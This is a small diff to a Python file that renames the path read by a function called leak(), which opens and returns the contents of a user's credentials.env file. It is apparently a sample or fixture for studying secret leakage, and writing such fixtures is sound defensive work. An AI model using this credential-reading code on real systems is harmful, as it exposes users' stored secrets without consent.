@@ -5,7 +5,7 @@ import os
 
 
 def leak():
-    return open(os.path.expanduser("~/.agent-ready/credentials.env")).read()
+    return open(os.path.expanduser("~/.agentbundle/credentials.env")).read()
 
 
 if __name__ == "__main__":
